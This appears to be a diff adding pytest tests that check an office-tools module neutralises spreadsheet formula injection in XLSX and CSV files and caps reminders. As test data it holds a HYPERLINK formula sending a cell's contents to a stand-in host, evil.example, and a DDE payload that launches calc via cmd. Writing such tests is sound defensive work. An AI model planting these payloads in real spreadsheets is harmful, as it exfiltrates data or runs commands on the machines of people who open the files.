@@ -145,3 +145,69 @@ def test_a_sheet_with_a_total_refuses_blank_amounts():
         "Expenses", ["Item", "Amount"], [["Rent", 1], ["", ""]], ["Amount"]
     )
     assert table.rows == [["Rent", 1]]
+
+
+# --- Coordinator review: formula injection, reminder fan-out ------------------------------
+
+EVIL = '=HYPERLINK("http://evil.example/exfil?u="&A1,"Click for discount")'
+
+
+def test_formula_text_in_an_xlsx_stays_text_and_only_our_total_is_a_formula(tmp_path):
+    from openpyxl import load_workbook
+
+    table = office._checked_table(
+        "Groceries",
+        ["Item", "Amount"],
+        [[EVIL, 10], ["+cmd|' /C calc'!A0", 5], ["@SUM(1)", 2]],
+        ["Amount"],
+    )
+    path = tmp_path / "groceries.xlsx"
+    office.write_table(table, path)
+
+    cells = [c for row in load_workbook(path).active.iter_rows() for c in row]
+    formulas = [c.value for c in cells if c.data_type == "f"]
+    assert formulas == ["=SUM(B2:B4)"]
+    assert any(c.value == EVIL and c.data_type == "s" for c in cells)
+
+
+def test_formula_text_in_a_csv_is_neutralised(tmp_path):
+    path = tmp_path / "groceries.csv"
+    office.write_table(office.Table("G", ["Item", "Amount"], [[EVIL, 10], ["-2+3", 1]], []), path)
+
+    text = path.read_text(encoding="utf-8")
+
+    assert "'=HYPERLINK" in text and "'-2+3" in text
+    assert not any(line.startswith(("=", "+", "-", "@")) for line in text.splitlines())
+
+
+def test_an_edit_keeps_injected_text_literal(tmp_path, monkeypatch):
+    from openpyxl import load_workbook
+
+    monkeypatch.setattr(office, "DOCUMENTS_DIR", tmp_path)
+    path = tmp_path / "g.xlsx"
+    office.write_table(office.Table("G", ["Item", "Amount"], [["Milk", 1]], ["Amount"]), path)
+
+    office.edit_file_part(str(path), 2, "", [EVIL, 3])
+
+    formulas = [
+        c.value for row in load_workbook(path).active.iter_rows() for c in row if c.data_type == "f"
+    ]
+    assert formulas == ["=SUM(B2:B3)"]
+
+
+def test_reminders_are_capped_per_command_and_in_total(monkeypatch):
+    monkeypatch.setattr(reminders, "_timers", [])
+    monkeypatch.setattr(reminders, "_per_task", {})
+    monkeypatch.setattr(reminders, "_schedule_email", lambda when, text: reminders.EMAIL_SET)
+    monkeypatch.setattr(reminders, "_speak", lambda _text: None)
+    for n in range(reminders.REMINDER_MAX_PER_TASK):
+        reminders.set_reminder(f"thing {n}", in_minutes=30)
+
+    with pytest.raises(ToolError, match="at most"):
+        reminders.set_reminder("one more", in_minutes=30)
+
+    monkeypatch.setattr(reminders, "_per_task", {})
+    alive = SimpleNamespace(is_alive=lambda: True)
+    monkeypatch.setattr(reminders, "_timers", [alive] * reminders.REMINDER_MAX_ACTIVE)
+    with pytest.raises(ToolError, match="already have"):
+        reminders.set_reminder("another", in_minutes=30)
